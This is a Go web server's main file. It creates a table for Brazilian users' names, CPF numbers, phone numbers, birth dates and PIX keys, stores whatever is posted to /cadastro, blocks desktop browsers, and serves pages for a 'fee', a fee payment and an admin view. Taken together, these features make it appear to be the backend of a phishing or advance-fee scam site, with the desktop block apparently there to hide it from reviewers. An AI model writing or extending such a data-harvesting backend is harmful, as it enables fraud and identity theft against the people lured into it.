package main

import (
	"log"
	"main/db"
	"main/routes"
	"net/http"
	"main/controllers"

	"github.com/gin-gonic/gin"
	_ "github.com/lib/pq"
)

func main() {
	// Starts Gin server
	r := gin.Default()

	// Start db instance
	dbInstance := db.New()
	queries := db.NewQueries(dbInstance.DB)

	// Cria a tabela usuarios se não existir
	_, err := dbInstance.Exec(`
		CREATE TABLE IF NOT EXISTS usuarios (
			id SERIAL PRIMARY KEY,
			nome TEXT NOT NULL,
			cpf TEXT NOT NULL,
			telefone TEXT NOT NULL,
			dia TEXT NOT NULL,
			mes TEXT NOT NULL,
			ano TEXT NOT NULL,
			chave_pix TEXT NOT NULL
		);
	`)
	if err != nil {
		log.Fatal(err)
	}
	
	// Cria uma rota para inserir os dados
	r.POST("/cadastro", func(c *gin.Context) {
		// Lê os dados do corpo da requisição
		var usuario db.CriarUsuarioParams
		err := c.BindJSON(&usuario)
		if err != nil {
			log.Println("Erro ao ler os dados:", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Erro ao ler os dados"})
			return
		}

		// Insere os dados no banco de dados
		err = queries.CriarUsuario(usuario)
		if err != nil {
			log.Println("Erro ao inserir os dados:", err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao inserir os dados"})
			return
		}

		// Retorna uma resposta de sucesso
		c.JSON(http.StatusCreated, gin.H{"success": true, "data": usuario})
	})

	// Middleware
	r.Use(controllers.BlockDesktopBrowsers)
	// Serve static files from the img directory
	r.Static("/img", "./img")

	// Serve the index.html file
	r.LoadHTMLFiles("./public/index.html", "./public/taxa.html", "./public/importante.html", "./public/inicial.html", "./public/dados.html", "./public/pagamento-taxa.html", "./public/inicial.html", "./public/admin.html")

	routes.SetupRoutes(r)

	// Start the server
	r.Run(":8080")
}